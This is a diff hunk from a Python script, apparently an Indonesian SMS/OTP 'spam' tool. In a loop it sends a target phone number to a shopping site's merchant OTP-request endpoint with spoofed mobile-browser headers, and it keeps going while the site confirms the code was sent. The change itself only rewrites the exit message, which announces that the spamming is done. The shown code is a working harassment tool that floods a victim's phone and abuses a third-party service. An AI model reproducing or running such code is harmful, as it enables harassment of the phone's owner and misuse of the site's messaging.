@@ -83,7 +83,7 @@ class nyepam:
 				send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
 				if "Kode OTP berhasil dikirim!" in send:continue
 				else:break
-			exit("# Dah selesai cuk, jangan lupa follow IG @akmalokz")
+			exit("# DAH DONE SPAM NYA!! JANGAN DI MAIN IN LAGI YA:)")
 		except reek.exceptions.ReadTimeout:exit("[!] Kesalahan Pada Koneksi")
 		except reek.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
 		except (KeyboardInterrupt,EOFError):exit("[!] Exit")
